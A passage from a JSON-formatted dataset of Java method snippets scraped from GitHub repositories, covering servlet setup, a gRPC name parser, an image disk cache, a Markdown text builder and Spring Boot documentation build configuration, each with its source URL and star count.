  root.addServlet(new ServletHolder(new TriggerManagerServlet()), \"/triggers\");    root.addServlet(new ServletHolder(new StatsServlet()), \"/stats\");    root.addServlet(new ServletHolder(new StatusServlet(this.statusService)), \"/status\");    root.addServlet(new ServletHolder(new NoteServlet()), \"/notes\");    root.addServlet(new ServletHolder(new FlowTriggerInstanceServlet()), \"/flowtriggerinstance\");    root.addServlet(new ServletHolder(new FlowTriggerServlet()), \"/flowtrigger\");    root.addServlet(new ServletHolder(new CycleServlet()), \"/cycle\");    final ServletHolder restliHolder = new ServletHolder(new RestliServlet());    restliHolder.setInitParameter(\"resourcePackages\", \"azkaban.restli\");    root.addServlet(restliHolder, \"/restli/*\");    final String viewerPluginDir =        this.props.getString(\"viewer.plugin.dir\", \"plugins/viewer\");    loadViewerPlugins(root, viewerPluginDir, getVelocityEngine());    // Trigger Plugin Loader    final TriggerPluginLoader triggerPluginLoader = new TriggerPluginLoader(this.props);    final Map<String, TriggerPlugin> triggerPlugins = triggerPluginLoader.loadTriggerPlugins(root);    setTriggerPlugins(triggerPlugins);    // always have basic time trigger    // TODO: find something else to do the job    getTriggerManager().start();    root.setAttribute(Constants.AZKABAN_SERVLET_CONTEXT_KEY, this);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getAlerterHolder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AlerterHolder", "snippet": "  public AlerterHolder getAlerterHolder() {    return alerterHolder;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/AzkabanWebServer.java", "stars": "18", "class": {"name": "AzkabanWebServer", "extends": "AzkabanServer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getApi() {        return \"code/checkout\";    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/VerifyCodeApi.java", "stars": "1", "class": {"name": "VerifyCodeApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "setPhone", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "VerifyCodeApi", "snippet": "    public VerifyCodeApi setPhone(String phone) {        this.phone = phone;        return this;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/VerifyCodeApi.java", "stars": "1", "class": {"name": "VerifyCodeApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "VerifyCodeApi", "snippet": "    public VerifyCodeApi setCode(String code) {        this.code = code;        return this;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/VerifyCodeApi.java", "stars": "1", "class": {"name": "VerifyCodeApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "executeProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\t\tif (dependencies.get(\"entity\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency entity for procedure RightClickedPaeonia!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"x\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency x for procedure RightClickedPaeonia!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"y\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency y for procedure RightClickedPaeonia!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"z\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency z for procedure RightClickedPaeonia!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"world\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency world for procedure RightClickedPaeonia!\");\t\t\treturn;\t\t}\t\tEntity entity = (Entity) dependencies.get(\"entity\");\t\tint x = (int) dependencies.get(\"x\");\t\tint y = (int) dependencies.get(\"y\");\t\tint z = (int) dependencies.get(\"z\");\t\tWorld world = (World) dependencies.get(\"world\");\t\tif ((((entity instanceof LivingEntity) ? ((LivingEntity) entity).getHeldItemMainhand() : ItemStack.EMPTY)\t\t\t\t.getItem() == new ItemStack(Blocks.AIR, (int) (1)).getItem())) {\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.AIR.getDefaultState(), 3);\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.FLOWER_POT.getDefaultState(), 3);\t\t\tif (entity instanceof LivingEntity) {\t\t\t\tItemStack _setstack = new ItemStack(PaeoniaBlock.block, (int) (1));\t\t\t\t_setstack.setCount((int) 1);\t\t\t\t((LivingEntity) entity).setHeldItem(Hand.MAIN_HAND, _setstack);\t\t\t\tif (entity instanceof ServerPlayerEntity)\t\t\t\t\t((ServerPlayerEntity) entity).inventory.markDirty();\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/RightClickedPaeoniaProcedure.java", "stars": "2", "class": {"name": "RightClickedPaeoniaProcedure", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "parseFullGrpcMethodName", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ProtoMethodName", "snippet": "  public static ProtoMethodName parseFullGrpcMethodName(String fullMethodName) {    // Ask grpc for the service name.    String fullServiceName = io.grpc.MethodDescriptor.extractFullServiceName(fullMethodName);    if (fullServiceName == null) {      throw new IllegalArgumentException(\"Could not extract full service from \" + fullMethodName);    }    // Make sure there is a '/' and use the rest as the method name.    int serviceLength = fullServiceName.length();    if (serviceLength + 1 >= fullMethodName.length()        || fullMethodName.charAt(serviceLength) != '/') {      throw new IllegalArgumentException(\"Could not extract method name from \" + fullMethodName);    }    String methodName = fullMethodName.substring(fullServiceName.length() + 1);    // Extract the leading package from the service name.    int index = fullServiceName.lastIndexOf('.');    if (index == -1) {      throw new IllegalArgumentException(\"Could not extract package name from \" + fullServiceName);    }    String packageName = fullServiceName.substring(0, index);    // Make sure there is a '.' and use the rest as the service name.    if (index + 1 >= fullServiceName.length() || fullServiceName.charAt(index) != '.') {      throw new IllegalArgumentException(\"Could not extract service from \" + fullServiceName);    }    String serviceName = fullServiceName.substring(index + 1);    return new ProtoMethodName(packageName, serviceName, methodName);  }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/protobuf/ProtoMethodName.java", "stars": "3", "class": {"name": "ProtoMethodName", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPackageName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPackageName() {    return packageName;  }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/protobuf/ProtoMethodName.java", "stars": "3", "class": {"name": "ProtoMethodName", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getServiceName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getServiceName() {    return serviceName;  }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/protobuf/ProtoMethodName.java", "stars": "3", "class": {"name": "ProtoMethodName", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFullServiceName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFullServiceName() {    return Joiner.on(\".\").join(packageName, serviceName);  }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/protobuf/ProtoMethodName.java", "stars": "3", "class": {"name": "ProtoMethodName", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMethodName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getMethodName() {    return methodName;  }", "url": "https://raw.githubusercontent.com/zalopay-oss/jmeter-grpc-request/master/src/main/java/vn/zalopay/benchmark/core/protobuf/ProtoMethodName.java", "stars": "3", "class": {"name": "ProtoMethodName", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addMovedPacman", "params": ["Pacman"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addMovedPacman(Pacman pac) {        movedPacmen.add(pac);    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/MovementResolution.java", "stars": "15", "class": {"name": "MovementResolution", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMovedPacmen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Pacman>", "snippet": "    public List<Pacman> getMovedPacmen() {        return movedPacmen;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/MovementResolution.java", "stars": "15", "class": {"name": "MovementResolution", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBlockedPacmen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Pacman>", "snippet": "    public List<Pacman> getBlockedPacmen() {        return blockedPacmen;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/MovementResolution.java", "stars": "15", "class": {"name": "MovementResolution", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addBlockedPacmen", "params": ["Pacman"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addBlockedPacmen(Pacman pac) {        blockedPacmen.add(pac);    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/MovementResolution.java", "stars": "15", "class": {"name": "MovementResolution", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBlockerOf", "params": ["Pacman"], "throws": null, "modifiers": ["public"], "return_type": "Pacman", "snippet": "    public Pacman getBlockerOf(Pacman pac) {        return blockedBy.get(pac);    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/MovementResolution.java", "stars": "15", "class": {"name": "MovementResolution", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "calculateCacheSizeAndFillUsageMap", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void calculateCacheSizeAndFillUsageMap() {\t\tnew Thread(new Runnable() {\t\t\t@Override\t\t\tpublic void run() {\t\t\t\tint size = 0;\t\t\t\tFile[] cachedFiles = cacheDir.listFiles();\t\t\t\tif (cachedFiles != null) { // rarely but it can happen, don't know why\t\t\t\t\tfor (File cachedFile : cachedFiles) {\t\t\t\t\t\tsize += getSize(cachedFile);\t\t\t\t\t\tlastUsageDates.put(cachedFile, cachedFile.lastModified());\t\t\t\t\t}\t\t\t\t\tcacheSize.set(size);\t\t\t\t}\t\t\t}\t\t}).start();\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/disc/LimitedDiscCache.java", "stars": "74", "class": {"name": "LimitedDiscCache", "extends": "BaseDiscCache", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "put", "params": ["String", "File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void put(String key, File file) {\t\tint valueSize = getSize(file);\t\tint curCacheSize = cacheSize.get();\t\twhile (curCacheSize + valueSize > sizeLimit) {\t\t\tint freedSize = removeNext();\t\t\tif (freedSize == INVALID_SIZE) break; // cache is empty (have nothing to delete)\t\t\tcurCacheSize = cacheSize.addAndGet(-freedSize);\t\t}\t\tcacheSize.addAndGet(valueSize);\t\tLong currentTime = System.currentTimeMillis();\t\tfile.setLastModified(currentTime);\t\tlastUsageDates.put(file, currentTime);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/disc/LimitedDiscCache.java", "stars": "74", "class": {"name": "LimitedDiscCache", "extends": "BaseDiscCache", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "get", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "\tpublic File get(String key) {\t\tFile file = super.get(key);\t\tLong currentTime = System.currentTimeMillis();\t\tfile.setLastModified(currentTime);\t\tlastUsageDates.put(file, currentTime);\t\treturn file;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/disc/LimitedDiscCache.java", "stars": "74", "class": {"name": "LimitedDiscCache", "extends": "BaseDiscCache", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clear() {\t\tlastUsageDates.clear();\t\tcacheSize.set(0);\t\tsuper.clear();\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/disc/LimitedDiscCache.java", "stars": "74", "class": {"name": "LimitedDiscCache", "extends": "BaseDiscCache", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "removeNext", "params": [], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int removeNext() {\t\tif (lastUsageDates.isEmpty()) {\t\t\treturn INVALID_SIZE;\t\t}\t\tLong oldestUsage = null;\t\tFile mostLongUsedFile = null;\t\tSet<Entry<File, Long>> entries = lastUsageDates.entrySet();\t\tsynchronized (lastUsageDates) {\t\t\tfor (Entry<File, Long> entry : entries) {\t\t\t\tif (mostLongUsedFile == null) {\t\t\t\t\tmostLongUsedFile = entry.getKey();\t\t\t\t\toldestUsage = entry.getValue();\t\t\t\t} else {\t\t\t\t\tLong lastValueUsage = entry.getValue();\t\t\t\t\tif (lastValueUsage < oldestUsage) {\t\t\t\t\t\toldestUsage = lastValueUsage;\t\t\t\t\t\tmostLongUsedFile = entry.getKey();\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\tint fileSize = 0;\t\tif (mostLongUsedFile != null) {\t\t\tif (mostLongUsedFile.exists()) {\t\t\t\tfileSize = getSize(mostLongUsedFile);\t\t\t\tif (mostLongUsedFile.delete()) {\t\t\t\t\tlastUsageDates.remove(mostLongUsedFile);\t\t\t\t}\t\t\t} else {\t\t\t\tlastUsageDates.remove(mostLongUsedFile);\t\t\t}\t\t}\t\treturn fileSize;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/disc/LimitedDiscCache.java", "stars": "74", "class": {"name": "LimitedDiscCache", "extends": "BaseDiscCache", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getSize", "params": ["File"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "int", "snippet": "\tprotected abstract int getSize(File file);}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/disc/LimitedDiscCache.java", "stars": "74", "class": {"name": "LimitedDiscCache", "extends": "BaseDiscCache", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "visit", "params": ["Document"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visit(Document document) {    text = document.getChars().toString();    pos = 0;    dummyCounter = 0;    nodeTypeStack.clear();    visitChildren(document);    if (pos < text.length()) addMarkup(text.length());  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "visitChildren", "params": ["Node"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void visitChildren(final Node node) {    node.getChildren().forEach(this::visit);  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isInNodeType", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isInNodeType(String nodeType) {    return nodeTypeStack.contains(nodeType);  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isInNodeType", "params": ["List<String>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isInNodeType(List<String> nodeTypes) {    for (String nodeType : nodeTypeStack) {      if (nodeTypes.contains(nodeType)) return true;    }    return false;  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addMarkup", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void addMarkup(int newPos) {    boolean inParagraph = isInNodeType(\"Paragraph\");    while (true) {      if ((pos >= text.length()) || (pos >= newPos)) break;      int curPos = text.indexOf('\\r', pos);      if ((curPos == -1) || (curPos >= newPos)) {        curPos = text.indexOf('\\n', pos);        if ((curPos == -1) || (curPos >= newPos)) break;      }      if (curPos > pos) builder.addMarkup(text.substring(pos, curPos));      builder.addMarkup(text.substring(curPos, curPos + 1), (inParagraph ? \" \" : \"\\n\"));      pos = curPos + 1;    }    if (newPos > pos) {      builder.addMarkup(text.substring(pos, newPos));      pos = newPos;    }  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addText", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void addText(int newPos) {    if (newPos > pos) {      builder.addText(text.substring(pos, newPos));      pos = newPos;    }  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generateDummy", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String generateDummy() {    return Tools.generateDummy(language, dummyCounter++);  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "visit", "params": ["Node"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void visit(Node node) {    String nodeType = node.getClass().getSimpleName();    if (nodeType.equals(\"Text\")) {      if (isInNodeType(ignoreNodeTypes)) {        addMarkup(node.getEndOffset());      } else {        addMarkup(node.getStartOffset());        addText(node.getEndOffset());      }    } else if (dummyNodeTypes.contains(nodeType)) {      addMarkup(node.getStartOffset());      int newPos = node.getEndOffset();      if (newPos > pos) {        builder.addMarkup(text.substring(pos, newPos), generateDummy());        pos = newPos;      }    } else {      if (nodeType.equals(\"Paragraph\")) {        addMarkup(node.getStartOffset());      }      nodeTypeStack.push(nodeType);      visitChildren(node);      nodeTypeStack.pop();    }  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAnnotatedText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AnnotatedText", "snippet": "  public AnnotatedText getAnnotatedText() {    return builder.build();  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/markdown/MarkdownAnnotatedTextBuilder.java", "stars": "3", "class": {"name": "MarkdownAnnotatedTextBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "creerEmpreinte_devrait_appeler_hashgenerator_pour_lancer_la_production_du_hash", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void creerEmpreinte_devrait_appeler_hashgenerator_pour_lancer_la_production_du_hash() {        // Given        String hashInput = \"hash\";        String hashOutput = \"hash2\";        when(hashGenerator.hasherAvecPepper(hashInput)).thenReturn(hashOutput);        // When        String empreinte = creerEmpreinteIdentite.creer(hashInput);        // Then        assertThat(empreinte).isEqualTo(hashOutput);    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/CreerEmpreinteIdentiteTest.java", "stars": "5", "class": {"name": "CreerEmpreinteIdentiteTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "apply", "params": ["Project"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid apply(Project project) {\t\tproject.getPlugins().withType(AsciidoctorJPlugin.class, (asciidoctorPlugin) -> {\t\t\tconfigureDocResourcesRepository(project);\t\t\tmakeAllWarningsFatal(project);\t\t\tUnzipDocumentationResources unzipResources = createUnzipDocumentationResourcesTask(project);\t\t\tproject.getTasks().withType(AbstractAsciidoctorTask.class, (asciidoctorTask) -> {\t\t\t\tconfigureCommonAttributes(project, asciidoctorTask);\t\t\t\tconfigureOptions(asciidoctorTask);\t\t\t\tasciidoctorTask.baseDirFollowsSourceDir();\t\t\t\tSync syncSource = createSyncDocumentationSourceTask(project, asciidoctorTask);\t\t\t\tif (asciidoctorTask instanceof AsciidoctorTask) {\t\t\t\t\tconfigureHtmlOnlyAttributes(asciidoctorTask);\t\t\t\t\tsyncSource.from(unzipResources, (resources) -> resources.into(\"asciidoc\"));\t\t\t\t\tasciidoctorTask.doFirst(new Action<Task>() {\t\t\t\t\t\t@Override\t\t\t\t\t\tpublic void execute(Task task) {\t\t\t\t\t\t\tproject.copy((spec) -> {\t\t\t\t\t\t\t\tspec.from(asciidoctorTask.getSourceDir());\t\t\t\t\t\t\t\tspec.into(asciidoctorTask.getOutputDir());\t\t\t\t\t\t\t\tspec.include(\"css/**\", \"js/**\");\t\t\t\t\t\t\t});\t\t\t\t\t\t}\t\t\t\t\t});\t\t\t\t}\t\t\t});\t\t});\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "configureDocResourcesRepository", "params": ["Project"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void configureDocResourcesRepository(Project project) {\t\tproject.getRepositories().maven((mavenRepo) -> {\t\t\tmavenRepo.setUrl(URI.create(\"https://repo.spring.io/release\"));\t\t\tmavenRepo.mavenContent((mavenContent) -> mavenContent.includeGroup(\"io.spring.docresources\"));\t\t});\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "makeAllWarningsFatal", "params": ["Project"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void makeAllWarningsFatal(Project project) {\t\tproject.getExtensions().getByType(AsciidoctorJExtension.class).fatalWarnings(\".*\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "createUnzipDocumentationResourcesTask", "params": ["Project"], "throws": null, "modifiers": ["private"], "return_type": "UnzipDocumentationResources", "snippet": "\tprivate UnzipDocumentationResources createUnzipDocumentationResourcesTask(Project project) {\t\tConfiguration documentationResources = project.getConfigurations().maybeCreate(\"documentationResources\");\t\tdocumentationResources.getDependencies()\t\t\t\t.add(project.getDependencies().create(\"io.spring.docresources:spring-doc-resources:0.2.2.RELEASE\"));\t\tUnzipDocumentationResources unzipResources = project.getTasks().create(\"unzipDocumentationResources\",\t\t\t\tUnzipDocumentationResources.class);\t\tunzipResources.setResources(documentationResources);\t\tunzipResources.setOutputDir(new File(project.getBuildDir(), \"docs/resources\"));\t\treturn unzipResources;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "createSyncDocumentationSourceTask", "params": ["Project", "AbstractAsciidoctorTask"], "throws": null, "modifiers": ["private"], "return_type": "Sync", "snippet": "\tprivate Sync createSyncDocumentationSourceTask(Project project, AbstractAsciidoctorTask asciidoctorTask) {\t\tSync syncDocumentationSource = project.getTasks()\t\t\t\t.create(\"syncDocumentationSourceFor\" + StringUtils.capitalize(asciidoctorTask.getName()), Sync.class);\t\tFile syncedSource = new File(project.getBuildDir(), \"docs/src/\" + asciidoctorTask.getName());\t\tsyncDocumentationSource.setDestinationDir(syncedSource);\t\tsyncDocumentationSource.from(\"src/docs/\");\t\tasciidoctorTask.dependsOn(syncDocumentationSource);\t\tasciidoctorTask.setSourceDir(project.relativePath(new File(syncedSource, \"asciidoc/\")));\t\treturn syncDocumentationSource;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "configureOptions", "params": ["AbstractAsciidoctorTask"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void configureOptions(AbstractAsciidoctorTask asciidoctorTask) {\t\tasciidoctorTask.options(Collections.singletonMap(\"doctype\", \"book\"));\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "configureHtmlOnlyAttributes", "params": ["AbstractAsciidoctorTask"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void configureHtmlOnlyAttributes(AbstractAsciidoctorTask asciidoctorTask) {\t\tMap<String, Object> attributes = new HashMap<>();\t\tattributes.put(\"highlightjsdir\", \"js/highlight\");\t\tattributes.put(\"highlightjs-theme\", \"github\");\t\tattributes.put(\"linkcss\", true);\t\tattributes.put(\"icons\", \"font\");\t\tattributes.put(\"stylesheet\", \"css/spring.css\");\t\tasciidoctorTask.attributes(attributes);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "configureCommonAttributes", "params": ["Project", "AbstractAsciidoctorTask"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void configureCommonAttributes(Project project, AbstractAsciidoctorTask asciidoctorTask) {\t\tMap<String, Object> attributes = new HashMap<>();\t\tattributes.put(\"attribute-missing\", \"warn\");\t\tattributes.put(\"github-tag\", determineGitHubTag(project));\t\tattributes.put(\"spring-boot-artifactory-repo\", ArtifactoryRepository.forProject(project));\t\tattributes.put(\"version\", \"{gradle-project-version}\");\t\tasciidoctorTask.attributes(attributes);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "determineGitHubTag", "params": ["Project"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "\tprivate String determineGitHubTag(Project project) {\t\tString version = \"v\" + project.getVersion();\t\treturn (version.endsWith(\"-SNAPSHOT\")) ? \"master\" : version;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "AsciidoctorConventions", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getResources", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FileCollection", "snippet": "\t\tpublic FileCollection getResources() {\t\t\treturn this.resources;\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "UnzipDocumentationResources", "extends": "DefaultTask", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": 